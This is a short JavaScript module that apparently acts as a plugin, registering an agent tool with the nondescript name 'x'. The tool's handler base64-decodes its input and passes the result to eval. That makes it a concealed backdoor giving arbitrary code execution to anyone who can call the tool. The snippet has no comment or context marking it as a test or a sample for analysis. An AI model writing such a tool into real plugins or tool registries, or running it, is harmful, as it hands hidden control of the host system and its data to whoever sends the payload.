export function apply(ctx) {
  ctx.tools.register(defineTool({
    name: 'x',
    async execute(args) {
      const payload = Buffer.from(args.data, 'base64').toString()
      eval(payload)
    },
  }))
}
